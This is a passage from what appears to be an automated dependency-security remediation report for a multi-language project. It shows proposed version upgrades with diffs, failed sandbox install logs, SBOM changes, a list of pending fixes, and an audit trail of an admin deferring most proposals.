- **Why (verified facts):** Upgrade com.fasterxml.jackson.core:jackson-databind 2.9.8 -> 2.18.11: fixes the 60 published advisories on 2.9.8; no known advisories remain on the target.
- **Advisor (AI inference):** P-019 upgrades the direct dependency com.fasterxml.jackson.core:jackson-databind from 2.9.8 to 2.18.11, addressing F-008's 60 known vulnerabilities, including a CRITICAL CVSS 9.8 issue, with no known advisories remaining on the target version. The trade-off is medium compatibility risk from the version jump in notifier/pom.xml, so the notifier's Jackson usage must be validated. Rollback is to restore 2.9.8 in notifier/pom.xml and the lockfile by reverting the remediation commit.
- **Reviewer checklist (AI):** Build and run the notifier test suite against jackson-databind 2.18.11 to catch API or behavior changes from the 2.9.8 upgrade. · Verify dependency resolution no longer brings in jackson-databind 2.9.8 through another path in notifier/pom.xml. · Exercise notifier serialization and deserialization paths that use Jackson before approving the upgrade.
- **Expected risk reduction:** 60 of 60 advisories fixed; resolves 1 finding(s)
- **Compatibility:** medium: minor version change (2.9.8 -> 2.18.11)
- **Rollback:** restore com.fasterxml.jackson.core:jackson-databind 2.9.8 in notifier/pom.xml (and the lockfile) by reverting the remediation commit
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

```diff
--- a/notifier/pom.xml
+++ b/notifier/pom.xml
@@ -28,7 +28,7 @@
     <dependency>
       <groupId>com.fasterxml.jackson.core</groupId>
       <artifactId>jackson-databind</artifactId>
-      <version>2.9.8</version>
+      <version>2.18.11</version>
     </dependency>
   </dependencies>
 </project>
```

### P-020 · ⏳ pending · upgrade · follow-redirects@1.13.0

- **Findings:** F-026 follow-redirects@1.13.0: 5 known vulnerabilities (highest HIGH, CVSS 8.0)
- **Change:** 1.13.0 → 1.16.2 in `package.json`
- **Why (verified facts):** Override the transitive copies follow-redirects 1.13.0 -> 1.16.2: fixes the 5 published advisories on 1.13.0; no known advisories remain on the target.
- **Advisor (AI inference):** P-020 adds an override to move transitive follow-redirects from 1.13.0 to 1.16.2, addressing F-026's 5 known vulnerabilities, including a HIGH CVSS 8.0 issue, with no known advisories remaining on the target. The trade-off is medium compatibility risk from the minor version change and the package.json override affecting transitive consumers, with package-lock.json regenerated during validation. Rollback is to restore follow-redirects 1.13.0 in package.json and the lockfile by reverting the remediation commit.
- **Reviewer checklist (AI):** Run the package install and test suite and confirm the regenerated package-lock.json resolves follow-redirects to 1.16.2 without conflicting with dependent packages. · Verify the override applies to all transitive copies of follow-redirects and that no old 1.13.0 copy remains in the resolved dependency tree. · Exercise code paths that use follow-redirects for HTTP redirects to check behavior under 1.16.2.
- **Expected risk reduction:** 5 of 5 advisories fixed; resolves 1 finding(s)
- **Compatibility:** medium: minor version change (1.13.0 -> 1.16.2)
- **Rollback:** restore follow-redirects 1.13.0 in package.json (and the lockfile) by reverting the remediation commit
- **Decision:** defer by admin at 2026-11-24T03:48:09+00:00: not decided

```diff
--- a/package.json
+++ b/package.json
@@ -16,5 +16,8 @@
   "license": "MIT",
   "devDependencies": {
     "crossenv": "7.0.3"
+  },
+  "overrides": {
+    "follow-redirects": "1.16.2"
   }
 }
# + package-lock.json regenerated from the registry during validation (npm --package-lock-only)
```

## 4. Validation: build, test and rescan

Sandbox `C:\Users\VICTUS\AppData\Local\Temp\sscg-validate-d7c35427f51d` · Docker: not running (image build skipped)

| Step | Before (unchanged) | After (remediated) | Time |
|---|---|---|---|
| regenerate lockfile (.) | · - | ✅ ok | 1.4s |
| docker build (./Dockerfile) | ➖ skipped | ➖ skipped | 0.0s |
| mvn test (notifier) | ➖ skipped | ➖ skipped | 0.0s |
| npm ci (.) | ❌ failed | ❌ failed | 2.5s |
| pip install -r requirements.txt (worker) | ❌ failed | ❌ failed | 1.3s |

<details><summary>after: npm ci (.): failed (log tail)</summary>

```
npm warn cleanup Failed to remove some directories [
npm warn cleanup   [
npm warn cleanup     'C:\\Users\\VICTUS\\AppData\\Local\\Temp\\sscg-validate-d7c35427f51d\\after\\node_modules\\axios',
npm warn cleanup     [Error: EPERM: operation not permitted, rmdir 'C:\Users\VICTUS\AppData\Local\Temp\sscg-validate-d7c35427f51d\after\node_modules\axios'] {
npm warn cleanup       errno: -4048,
npm warn cleanup       code: 'EPERM',
npm warn cleanup       syscall: 'rmdir',
npm warn cleanup       path: 'C:\\Users\\VICTUS\\AppData\\Local\\Temp\\sscg-validate-d7c35427f51d\\after\\node_modules\\axios'
npm warn cleanup     }
npm warn cleanup   ]
npm warn cleanup ]
npm error code E404
npm error 404 Not Found - GET https://registry.npmjs.org/crossenv/-/crossenv-7.0.3.tgz - Not found
npm error 404
npm error 404  'crossenv@https://registry.npmjs.org/crossenv/-/crossenv-7.0.3.tgz' is not in this registry.
npm error 404
npm error 404 Note that you can also install from a
npm error 404 tarball, folder, http url, or git url.
npm error A complete log of this run can be found in: C:\Users\VICTUS\AppData\Roaming\npm-cache\_logs\2026-11-24T03_48_22_855Z-debug-0.log
```
</details>

<details><summary>after: pip install -r requirements.txt (worker): failed (log tail)</summary>

```
ERROR: Ignored the following yanked versions: 6.0.2rc1
ERROR: Could not find a version that satisfies the requirement PyYAML==5.3 (from versions: 6.0.1, 6.0.2, 6.0.3, 6.0.4)
ERROR: No matching distribution found for PyYAML==5.3
```
</details>

<details><summary>before: npm ci (.): failed (log tail)</summary>

```
npm error code E404
npm error 404 Not Found - GET https://registry.npmjs.org/crossenv/-/crossenv-7.0.3.tgz - Not found
npm error 404
npm error 404  'crossenv@https://registry.npmjs.org/crossenv/-/crossenv-7.0.3.tgz' is not in this registry.
npm error 404
npm error 404 Note that you can also install from a
npm error 404 tarball, folder, http url, or git url.
npm error A complete log of this run can be found in: C:\Users\VICTUS\AppData\Roaming\npm-cache\_logs\2026-11-24T03_48_10_145Z-debug-0.log
```
</details>

<details><summary>before: pip install -r requirements.txt (worker): failed (log tail)</summary>

```
ERROR: Ignored the following yanked versions: 6.0.2rc1
ERROR: Could not find a version that satisfies the requirement PyYAML==5.3 (from versions: 6.0.1, 6.0.2, 6.0.3, 6.0.4)
ERROR: No matching distribution found for PyYAML==5.3
```
</details>

**SBOM before → after:** 4 changed · 7 added · 0 removed

- changed: maven:org.apache.logging.log4j:log4j-api 2.14.1 -> 2.25.4
- changed: maven:org.apache.logging.log4j:log4j-core 2.14.1 -> 2.25.4
- changed: maven:org.osgi:org.osgi.core 4.3.1 -> 6.0.0
- changed: npm:lodash 4.17.15 -> 4.18.1
- added: maven:biz.aQute.bnd:biz.aQute.bnd.annotation@7.1.0
- added: maven:com.google.errorprone:error_prone_annotations@2.38.0
- added: maven:org.jspecify:jspecify@1.0.0
- added: maven:org.osgi:org.osgi.annotation.bundle@2.0.0
- added: maven:org.osgi:org.osgi.annotation.versioning@1.1.2
- added: maven:org.osgi:org.osgi.resource@1.0.0
- added: maven:org.osgi:org.osgi.service.serviceloader@1.0.0

**Resolved findings:** F-005, F-007, F-020, F-021, F-025, F-038

**Newly introduced findings (after the change):**

- Medium: org.apache.logging.log4j:log4j-api@2.25.4: 1 known vulnerability (highest MEDIUM) (VULN)

## 5. Remaining and accepted risk

35 finding(s) remain; highest: F-004 (P0), F-006 (P0), F-012 (P0), F-013 (P0), F-033 (P0), F-034 (P0), F-041 (P0), F-011 (P0).
- ⏳ pending: P-002 replace crossenv@7.0.3
- ⏳ pending: P-004 replace python3-dateutil@2.8.1
- ⏳ pending: P-005 upgrade pyyaml@5.3.0
- ⏳ pending: P-006 block package.json scripts.postinstall
- ⏳ pending: P-007 upgrade minimist@0.0.8
- ⏳ pending: P-008 upgrade axios@0.21.0
- ⏳ pending: P-009 escalate review .github/workflows/ci.yml
- ⏳ pending: P-010 escalate review .github/workflows/ci.yml
- ⏳ pending: P-011 upgrade jinja2@2.10.0
- ⏳ pending: P-012 escalate review 
- ⏳ pending: P-013 update base image fastbuilds42/node:latest
- ⏳ pending: P-014 upgrade org.apache.commons:commons-text@1.9
- ⏳ pending: P-015 block .github/workflows/ci.yml
- ⏳ pending: P-016 block fastbuilds42/cache-helper
- ⏳ pending: P-017 mitigate .github/workflows/ci.yml
- ⏳ pending: P-018 block Dockerfile
- ⏳ pending: P-019 upgrade com.fasterxml.jackson.core:jackson-databind@2.9.8
- ⏳ pending: P-020 upgrade follow-redirects@1.13.0

## 6. Audit trail

- Knowledge base `3f82164646d4` · LLM engine rules-fallback (no LLM) · nothing was merged, deployed or released; the original repository was not modified.

| Agent | Kind | Status | Seconds | Tokens in/out |
|---|---|---|---|---|
| Orchestrator | deterministic | ok | 0.08 | 0/0 |
| Discovery | deterministic | ok | 0.14 | 0/0 |
| Vulnerability Intel | deterministic | ok | 1.34 | 0/0 |
| Detection | deterministic | ok | 0.72 | 0/0 |
| Evidence Gatherer | deterministic | ok | 0.85 | 0/0 |
| Triage | llm | ok | 13.97 | 3235/1724 |
| Triage | llm | ok | 6.55 | 3014/721 |
| Triage | llm | ok | 4.33 | 2795/814 |
| Triage | llm | ok | 9.47 | 2344/1730 |
| Triage | llm | ok | 5.64 | 2414/1092 |
| Triage | llm | ok | 6.41 | 2919/1136 |
| Triage | llm | ok | 7.83 | 3144/1472 |
| Triage | llm | ok | 19.13 | 2337/3830 |
| Triage | llm | ok | 5.94 | 3223/727 |
| Triage | llm | ok | 5.23 | 2999/985 |
| Triage | llm | ok | 16.64 | 2881/2009 |
| Triage | llm | ok | 10.75 | 1932/2149 |
| Triage | llm | ok | 6.89 | 2762/835 |
| Triage | deterministic | ok | 0.0 | 0/0 |
| Evidence Gatherer | deterministic | ok | 0.11 | 0/0 |
| Triage | llm | ok | 5.77 | 2421/1060 |
| Triage | llm | ok | 8.84 | 2691/1692 |
| Triage | llm | ok | 9.37 | 2990/1083 |
| Triage | llm | ok | 9.33 | 2392/1092 |
| Triage | deterministic | ok | 0.0 | 0/0 |
| Narrator | llm | ok | 6.8 | 5018/1378 |
| Reporter | deterministic | ok | 1.77 | 0/0 |
| Exploit Intel | deterministic | ok | 0.06 | 0/0 |
| Reachability | deterministic | ok | 0.04 | 0/0 |
| Prioritizer | deterministic | ok | 0.0 | 0/0 |
| Remediation | deterministic | ok | 0.29 | 0/0 |
| Remediation Advisor | llm | ok | 27.3 | 7525/4776 |
| Human Approval | human | ok | 0.0 | 0/0 |
| Validation | deterministic | ok | 26.38 | 0/0 |
| Human approval | human | approve P-001 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | approve P-003 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-002 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-004 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-005 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-006 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-007 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-008 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-009 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-010 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-011 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-012 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-013 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-014 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-015 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-016 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-017 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-018 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-019 by admin | 2026-11-24T03:48:09+00:00 | |
| Human approval | human | defer P-020 by admin | 2026-11-24T03:48:09+00:00 | |
